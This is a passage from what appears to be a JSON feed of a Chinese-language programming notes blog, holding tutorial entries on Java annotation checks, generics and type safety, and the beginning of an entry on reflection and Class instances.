punctuation\">(</span>value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\">// 判断值是否满足@Range的min/max:</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> range<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> range<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid field: \"</span> <span class=\"token operator\">+</span> field<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这样一来，我们通过<code>@Range</code>注解，配合<code>check()</code>方法，就可以完成<code>Person</code>实例的检查。注意检查逻辑完全是我们自己编写的，JVM不会自动给注解添加任何额外的逻辑。</p>\n",
      "date_published": "2024-09-06T08:31:38.000Z",
      "date_modified": "2024-09-06T08:31:38.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "7-泛型",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/7_Genericity.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/7_Genericity.html",
      "summary": "7-泛型\n泛型是一种“代码模板”，可以用一套代码套用各种类型。\n什么是泛型\n在讲解什么是泛型之前，我们先观察Java标准库提供的ArrayList，它可以看作“可变长度”的数组，因为用起来比数组更方便。\n实际上ArrayList内部就是一个Object[]数组，配合存储一个当前分配的长度，就可以充当“可变数组”：\n如果用上述ArrayList存储Str...",
      "content_html": "\n<p>泛型是一种“代码模板”，可以用一套代码套用各种类型。</p>\n<h2>什么是泛型</h2>\n<p>在讲解什么是泛型之前，我们先观察Java标准库提供的<code>ArrayList</code>，它可以看作“可变长度”的数组，因为用起来比数组更方便。</p>\n<p>实际上<code>ArrayList</code>内部就是一个<code>Object[]</code>数组，配合存储一个当前分配的长度，就可以充当“可变数组”：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ArrayList</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> array<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果用上述<code>ArrayList</code>存储<code>String</code>类型，会有这么几个缺点：</p>\n<ul>\n<li>需要强制转型；</li>\n<li>不方便，易出错。</li>\n</ul>\n<p>例如，代码必须这么写：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">ArrayList</span> list <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlist<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 获取到Object，必须强制转型为String:</span>\n<span class=\"token class-name\">String</span> first <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> list<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>很容易出现ClassCastException，因为容易“误转型”：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// ERROR: ClassCastException:</span>\n<span class=\"token class-name\">String</span> second <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> list<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>要解决上述问题，我们可以为<code>String</code>单独编写一种<code>ArrayList</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">StringArrayList</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> array<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这样一来，存入的必须是<code>String</code>，取出的也一定是<code>String</code>，不需要强制转型，因为编译器会强制检查放入的类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">StringArrayList</span> list <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlist<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> first <span class=\"token operator\">=</span> list<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 编译错误: 不允许放入非String类型:</span>\nlist<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>问题暂时解决。</p>\n<p>然而，新的问题是，如果要存储<code>Integer</code>，还需要为<code>Integer</code>单独编写一种<code>ArrayList</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IntegerArrayList</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> array<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Integer</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>实际上，还需要为其他所有class单独编写一种<code>ArrayList</code>：</p>\n<ul>\n<li>LongArrayList</li>\n<li>DoubleArrayList</li>\n<li>PersonArrayList</li>\n<li>...</li>\n</ul>\n<p>这是不可能的，JDK的class就有上千个，而且它还不知道其他人编写的class。</p>\n<p>为了解决新的问题，我们必须把<code>ArrayList</code>变成一种模板：<code>ArrayList&lt;T&gt;</code>，代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> array<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">T</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>T</code>可以是任何class。这样一来，我们就实现了：编写一次模版，可以创建任意类型的<code>ArrayList</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 创建可以存储String的ArrayList:</span>\n<span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> strList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 创建可以存储Float的ArrayList:</span>\n<span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Float</span><span class=\"token punctuation\">&gt;</span></span> floatList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Float</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 创建可以存储Person的ArrayList:</span>\n<span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">&gt;</span></span> personList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>因此，泛型就是定义一种模板，例如<code>ArrayList&lt;T&gt;</code>，然后在代码中为用到的类创建对应的<code>ArrayList&lt;类型&gt;</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> strList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>由编译器针对类型作检查：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>strList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// OK</span>\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> strList<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// OK</span>\nstrList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// compile error!</span>\n<span class=\"token class-name\">Integer</span> n <span class=\"token operator\">=</span> strList<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// compile error!</span>\n</code></pre></div><p>这样一来，既实现了编写一次，万能匹配，又通过编译器保证了类型安全：这就是泛型。</p>\n<h3>向上转型</h3>\n<p>在Java标准库中的<code>ArrayList&lt;T&gt;</code>实现了<code>List&lt;T&gt;</code>接口，它可以向上转型为<code>List&lt;T&gt;</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> list <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>即类型<code>ArrayList&lt;T&gt;</code>可以向上转型为<code>List&lt;T&gt;</code>。</p>\n<p>要<em>特别注意</em>：不能把<code>ArrayList&lt;Integer&gt;</code>向上转型为<code>ArrayList&lt;Number&gt;</code>或<code>List&lt;Number&gt;</code>。</p>\n<p>这是为什么呢？假设<code>ArrayList&lt;Integer&gt;</code>可以向上转型为<code>ArrayList&lt;Number&gt;</code>，观察一下代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 创建ArrayList&lt;Integer&gt;类型：</span>\n<span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span> integerList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 添加一个Integer：</span>\nintegerList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// “向上转型”为ArrayList&lt;Number&gt;：</span>\n<span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Number</span><span class=\"token punctuation\">&gt;</span></span> numberList <span class=\"token operator\">=</span> integerList<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 添加一个Float，因为Float也是Number：</span>\nnumberList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Float</span><span class=\"token punctuation\">(</span><span class=\"token number\">12.34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 从ArrayList&lt;Integer&gt;获取索引为1的元素（即添加的Float）：</span>\n<span class=\"token class-name\">Integer</span> n <span class=\"token operator\">=</span> integerList<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ClassCastException!</span>\n</code></pre></div><p>我们把一个<code>ArrayList&lt;Integer&gt;</code>转型为<code>ArrayList&lt;Number&gt;</code>类型后，这个<code>ArrayList&lt;Number&gt;</code>就可以接受<code>Float</code>类型，因为<code>Float</code>是<code>Number</code>的子类。但是，<code>ArrayList&lt;Number&gt;</code>实际上和<code>ArrayList&lt;Integer&gt;</code>是同一个对象，也就是<code>ArrayList&lt;Integer&gt;</code>类型，它不可能接受<code>Float</code>类型， 所以在获取<code>Integer</code>的时候将产生<code>ClassCastException</code>。</p>\n<p>实际上，编译器为了避免这种错误，根本就不允许把<code>ArrayList&lt;Integer&gt;</code>转型为<code>ArrayList&lt;Number&gt;</code>。</p>\n<p>特别注意</p>\n<p><code>ArrayList&lt;Integer&gt;</code>和<code>ArrayList&lt;Number&gt;</code>两者完全没有继承关系。</p>\n<p>用一个图来表示泛型的继承关系，就是<code>T</code>不变时，可以向上转型，<code>T</code>本身不能向上转型：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>  List&lt;Integer&gt;     ArrayList&lt;Number&gt;\n    ▲                            ▲\n    │                            │\n    │                            X\n    │                            │\nArrayList&lt;Integer&gt;  ArrayList&lt;Integer&gt;\n</code></pre></div>",
      "date_published": "2024-09-06T08:31:38.000Z",
      "date_modified": "2024-09-11T13:20:40.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "前端",
      "url": "https://echo0d.github.io/DailyNotes/develop/FrontEnd/",
      "id": "https://echo0d.github.io/DailyNotes/develop/FrontEnd/",
      "summary": "前端\n原来写的咋就找不到了呢~  真服了",
      "content_html": "\n<p>原来写的咋就找不到了呢~  真服了</p>\n",
      "date_published": "2024-09-04T09:28:48.000Z",
      "date_modified": "2024-09-04T09:28:48.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "5-反射",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/5_Reflection.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/5_Reflection.html",
      "summary": "5-反射\nClass类\n除了int等基本类型外，Java的其他类型全部都是class（包括interface）。例如：\n\nString\nObject\nRunnable\nException\n...\n\n仔细思考，我们可以得出结论：class（包括interface）的本质是数据类型（Type）。无继承关系的数据类型无法赋值：\n而class是由JVM在执行过...",
      "content_html": "\n<h2>Class类</h2>\n<p>除了<code>int</code>等基本类型外，Java的其他类型全部都是<code>class</code>（包括<code>interface</code>）。例如：</p>\n<ul>\n<li><code>String</code></li>\n<li><code>Object</code></li>\n<li><code>Runnable</code></li>\n<li><code>Exception</code></li>\n<li>...</li>\n</ul>\n<p>仔细思考，我们可以得出结论：<code>class</code>（包括<code>interface</code>）的本质是数据类型（<code>Type</code>）。无继承关系的数据类型无法赋值：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Number</span> n <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Double</span><span class=\"token punctuation\">(</span><span class=\"token number\">123.456</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// OK</span>\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Double</span><span class=\"token punctuation\">(</span><span class=\"token number\">123.456</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// compile error!</span>\n</code></pre></div><p>而<code>class</code>是由JVM在执行过程中动态加载的。JVM在第一次读取到一种<code>class</code>类型时，将其加载进内存。</p>\n<p>每加载一种<code>class</code>，JVM就为其创建一个<code>Class</code>类型的实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>。它长这样：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Class</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>以<code>String</code>类为例，当JVM加载<code>String</code>类时，它首先读取<code>String.class</code>文件到内存，然后，为<code>String</code>类创建一个<code>Class</code>实例并关联起来：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>这个<code>Class</code>实例是JVM内部创建的，如果我们查看JDK源码，可以发现<code>Class</code>类的构造方法是<code>private</code>，只有JVM能创建<code>Class</code>实例，我们自己的Java程序是无法创建<code>Class</code>实例的。</p>\n<p>所以，JVM持有的每个<code>Class</code>实例都指向一个数据类型（<code>class</code>或<code>interface</code>）：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>┌───────────────────────────┐\n│      Class Instance       │────▶ String\n├───────────────────────────┤\n│name = \"java.lang.String\"  │\n└───────────────────────────┘\n┌───────────────────────────┐\n│      Class Instance       │────▶ Random\n├───────────────────────────┤\n│name = \"java.util.Random\"  │\n└───────────────────────────┘\n┌───────────────────────────┐\n│      Class Instance       │────▶ Runnable\n├───────────────────────────┤\n│name = \"java.lang.Runnable\"│\n└───────────────────────────┘\n</code></pre></div><p>一个<code>Class</code>实例包含了该<code>class</code>的所有完整信息：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>┌───────────────────────────┐\n│      Class Instance       │────▶ String\n├───────────────────────────┤\n│name = \"java.lang.String\"  │\n├───────────────────────────┤\n│package = \"java.lang\"      │\n├───────────────────────────┤\n│super = \"java.lang.Object\" │\n├───────────────────────────┤\n│interface = CharSequence...│\n├───────────────────────────┤\n│field = value[],hash,...   │\n├───────────────────────────┤\n│method = indexOf()...      │\n└───────────────────────────┘\n</code></pre></div><p>由于JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p>\n<p>这种通过<code>Class</code>实例获取<code>class</code>信息的方法称为反射（Reflection）。</p>\n<p>如何获取一个<code>class</code>的<code>Class</code>实例？有三个方法：</p>\n<p>方法一：直接通过一个<code>class</code>的静态变量<code>class</code>获取：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的<code>getClass()</code>方法获取：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>方法三：如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token 